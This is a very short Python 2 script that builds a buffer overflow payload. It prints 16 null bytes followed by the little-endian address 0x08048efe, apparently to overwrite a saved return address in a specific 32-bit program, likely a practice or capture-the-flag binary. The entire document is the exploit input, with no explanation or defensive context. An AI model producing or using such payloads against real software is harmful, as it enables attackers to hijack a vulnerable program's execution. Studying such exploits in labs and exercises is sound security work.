from struct import pack
add = pack("<I", 0x08048efe)
print '\x00' * 16 + add
